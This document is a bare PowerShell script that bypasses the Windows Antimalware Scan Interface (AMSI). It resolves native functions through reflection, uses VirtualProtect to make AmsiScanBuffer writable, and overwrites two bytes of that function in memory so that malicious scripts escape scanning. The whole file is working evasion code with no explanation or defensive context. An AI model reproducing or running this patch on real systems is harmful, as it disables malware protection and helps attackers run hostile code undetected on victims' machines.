function LookupFunc {

	Param ($moduleName, $functionName)

  $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And $_.Location.Split("\\")[-1].Equals('System.dll') }).gettype("Microsoft.Win32.UnsafeNativeMethods");
  $tmp=@()
  $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
  $moduleHandle = ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName))
  $moduleHandleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $moduleHandle)
  return $tmp[0].Invoke($null, @($moduleHandle, $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiScanBuffer
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0x75) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, [IntPtr]::add($funcAddr, 69), 1)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, [IntPtr]::add($funcAddr, 109), 1)

$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)

